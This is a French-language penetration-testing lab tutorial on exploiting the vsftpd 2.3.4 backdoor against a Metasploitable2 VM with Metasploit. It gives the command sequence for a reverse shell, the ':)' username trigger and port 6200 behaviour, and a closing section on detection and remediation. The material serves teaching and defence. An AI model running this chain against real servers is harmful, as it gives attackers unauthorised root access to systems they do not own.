Chronologie

Sept étapes, dans l'ordre où elles doivent se faire — chacune répond à une question précise avant de passer à la suivante.

Méthode exacte, en un coup d'œil

1
Mise en réseauip addr / ifconfig
Placer Kali et la cible sur le même sous-réseau isolé — sans ça, aucune couche au-dessus ne peut fonctionner.
2
Vérificationping
Confirmer que la connectivité de base existe, pour ne pas confondre un problème réseau avec une absence de faille.
3
Reconnaissancenmap -sV -sC
Lister les services ouverts et surtout leurs versions exactes — une faille cible toujours une version précise, jamais un service en général.
4
Recherche d'exploitsearchsploit
Croiser chaque version repérée avec une base d'exploits publics, en élargissant la recherche si un premier essai trop précis échoue.
5
Sélection du modulemsfconsole / search / use
Charger précisément le module qui correspond à la version vue par nmap, en écartant ceux qui ne font que planter le service (rank faible, chemin auxiliary/).
6
Configurationset RHOSTS / set LHOST
Donner au module la cible (RHOSTS) et, pour un payload reverse, l'adresse à laquelle il doit rappeler (LHOST) — jamais l'inverse.
7
Exploitationexploit / run
Déclencher le module, vérifier l'accès obtenu (getuid) avant toute chose, puis basculer en shell système pour la suite.
1

Sortir les deux VM du NAT

En NAT, chaque VM a sa propre sortie internet mais ne voit pas l'autre. Il faut les mettre sur un même segment réseau isolé.

kali@kali
$ sudo ip addr add 192.168.56.10/24 dev eth0
$ sudo ip link set eth0 up
msfadmin@metasploitable
$ sudo ifconfig eth0 192.168.56.20 netmask 255.255.255.0 up
pourquoiEn Réseau interne, il n'y a pas de serveur DHCP : personne ne distribue d'IP automatiquement. On en fixe une à la main sur chaque machine, dans le même sous-réseau (192.168.56.0/24). attentionCette IP n'est pas persistante : un redémarrage de la VM l'efface, il faut la retaper. retenirip addr add (Kali / Debian récent) et ifconfig (vieux système comme Metasploitable2) font la même chose : assigner une IP à une interface.
2

Vérifier que les deux machines se voient

Avant tout scan, confirmer que la couche réseau fonctionne.

kali@kali
$ ping 192.168.56.20
64 bytes from 192.168.56.20: icmp_seq=1 ttl=64 time=1.1 ms
pourquoiUn scan ou un exploit qui échoue peut avoir deux causes très différentes : la cible n'est pas vulnérable, ou le réseau ne fonctionne pas. Le ping élimine la seconde avant de chercher plus loin.

6

LHOST — l'adresse de retour du reverse shell

Avant de lancer l'exploit, une dernière variable à régler.

msfconsole
msf exploit(…) > set LHOST 192.168.56.10
LHOST => 192.168.56.10
pourquoile payload utilisé est un reverse shell : ce n'est pas Kali qui va "prendre" un accès, c'est la cible compromise qui va rappeler Kali. Pour ça, il faut lui dire où rappeler. LHOSTLocal HOST — ton IP à toi (l'attaquant), sur laquelle Metasploit écoute la connexion retour. à retenirRHOST = la cible · LHOST = toi. Les deux doivent être réglés avant de lancer l'exploit — l'ordre méthodique : module → RHOSTS → LHOST → exploit.

Exploitation et vérification

Le moment clé : la backdoor se déclenche et renvoie un accès.

msfconsole

[*] Started reverse TCP handler on 192.168.56.10:4444
[*] FTP banner hints its vulnerable: 220 (vsFTPd 2.3.4)
[+] The target appears to be vulnerable. backdoor may be present
[+] Backdoor has been spawned!

meterpreter > getuid

meterpreter > shell

root
handlerMetasploit ouvre d'abord un listener local (le "reverse TCP handler") avant même de toucher la cible — il attend que quelqu'un le rappelle. meterpreterun environnement propre à Metasploit, avec son propre jeu de commandes (getuid, pas whoami). La commande shell bascule vers un vrai terminal Linux de la cible, où whoami/id/ls fonctionnent normalement. pourquoi rootle service vsftpd tournait avec les privilèges root sur cette machine (mauvaise pratique très courante sur les vieux systèmes). La backdoor hérite automatiquement des droits du processus compromis — pas besoin d'escalade de privilèges en plus.

Ce qu'il faut vraiment comprendre

Backdoor ≠ vulnérabilité classique

Une faille logique (débordement de mémoire, injection) s'exploite en détournant un comportement du programme. Une backdoor comme celle de vsftpd 2.3.4 est du code ajouté délibérément par un tiers dans le source officiel : il suffit de déclencher le motif prévu, sans construire d'attaque technique.

Reverse shell : la cible rappelle l'attaquant

Un shell "direct" ferait se connecter Kali vers la cible. Un shell "reverse" fait l'inverse : le code exécuté sur la cible initie la connexion vers Kali (LHOST/LPORT), souvent pour contourner des restrictions réseau côté cible qui bloqueraient une connexion entrante.

Pourquoi un accès root direct

Le niveau de privilège obtenu dépend du compte sous lequel tournait le service compromis. vsftpd tournait ici en root — une configuration dangereuse mais fréquente sur les vieux systèmes non durcis. D'autres services mal configurés donnent un accès limité : il faut alors une étape supplémentaire d'élévation de privilèges.

Anatomie de la backdoor

Ce n'est pas une faille de vsftpd — c'est une archive piégée. Comprendre la différence change la façon de chercher ce genre d'incident.

Une chaîne d'approvisionnement compromise, pas un bug de code

Entre le 30 juin et le 3 juillet 2011, l'archive vsftpd-2.3.4.tar.gz proposée sur le site officiel de téléchargement a été remplacée par une version modifiée, suite à une intrusion sur le serveur qui l'hébergeait — référencé depuis sous CVE-2011-2523. Le numéro de version affiché restait "2.3.4" : rien dans le nom du fichier ne permettait de distinguer l'archive légitime de la piégée.

Le déclencheur

Le code ajouté observait le nom d'utilisateur envoyé au moment du login FTP. S'il contenait la séquence ":)", le processus ouvrait un shell brut sur le port TCP 6200, accessible ensuite à quiconque s'y connectait — sans mot de passe, sans lien avec le compte utilisé pour déclencher la condition.

reconstruction pédagogique — pas le code source exact
// principe du contrôle ajouté au login FTP (simplifié)
if (strstr(username, ":)") != NULL) {
    // ouvre un shell brut sur le port 6200, sans vérifier le mot de passe
    listen_and_spawn_shell(6200);
}

C'est exactement ce que fait le module Metasploit utilisé plus haut : il se connecte en FTP avec un nom d'utilisateur contenant ":)", puis se reconnecte sur le port 6200 pour récupérer le shell ouvert.

Pourquoi ça change la méthode de recherche

Une faille "classique" (débordement de mémoire, injection) s'exploite en étudiant le comportement du programme. Une archive piégée comme celle-ci ne se voit pas en auditant le code de vsftpd lui-même — seule une vérification d'intégrité de l'archive téléchargée (hash comparé à celui publié par les mainteneurs) l'aurait révélée avant l'installation.

Détection & remédiation

Le point de vue du défenseur : comment cet incident aurait pu être repéré, et ce qui limite l'impact d'un cas similaire à l'avenir.

md5sum / sha256sum archive.tar.gzcomparer le hash de toute archive téléchargée à celui publié par les mainteneurs, avant compilation — c'est la seule vérification qui aurait détecté celle-ci
netstat -tulpn / ss -tulpnun port 6200/tcp ouvert et non documenté sur un serveur FTP est un signal fort à surveiller
règle IDS dédiée (Snort/Suricata)signature connue pour ce motif de login — la détecte en surveillance réseau continue, sans attendre un audit manuel
mise à jour vers vsftpd ≥ 2.3.5la version corrigée retire le vecteur ; ne pas faire tourner le service en root réduit aussi l'impact si un cas similaire se reproduit

Terminal d'entraînement

Rejoue la chaîne d'exploitation toi-même — y compris la partie qu'on saute trop vite d'habitude : lire un résultat en entier et repérer ce qui compte. Le scan renvoie tout, à toi de chercher. Les indices donnent la logique, jamais la commande telle quelle.
